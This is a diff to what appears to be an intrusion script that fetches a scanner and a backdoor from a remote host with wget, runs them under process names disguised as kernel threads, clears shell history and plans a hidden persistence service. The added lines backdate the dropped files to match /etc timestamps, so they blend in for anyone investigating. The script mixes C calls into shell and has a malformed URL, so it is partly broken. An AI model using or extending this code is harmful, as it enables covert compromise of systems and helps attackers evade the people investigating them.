@@ -26,15 +26,23 @@ history -c
 execl("/bin/bash", "[kworker/3:1-ata_sff]", NULL);
 history -c
 
+#get last modified date
+ls -lt --time-style="long-iso" /etc | grep -o '\([12][0-9][0-9][0-9]\)-[0-1][0-9]-[0-3][0-9]\s[0-9][0-9]:[0-9][0-9]' | sort | uniq -c | sort -nr | head -n 1 | grep -o '\([12][0-9][0-9][0-9]\)-[0-1][0-9]-[0-3][0-9]\s[0-9][0-9]:[0-9][0-9]' > /tmp/.X11-LOCK-vmlinux
+XDG_SESSION_DATE=$(cat /tmp/.X11-LOCK-vmlinux)
+
+#todo
+
 
 #pull scan
 wget -O .procvar-0184929 $IP:6121/scan.priv
 chmod 755 .procvar-0184929
+touch -d "$XDG_SESSION_DATE" .procvar-0184929
 execl(".procvar-0184929", "[kworker/2:2-rcu_gp]", NULL);
 history -c
 
 #persist
 wget -O .uservar-0184929 $IP:6121:/backdoor.trigger
 chmod 750 .uservar-0184929
+touch -d "$XDG_SESSION_DATE" .uservar-0184929
 #make a service for the backkdor and hide it
 history -c
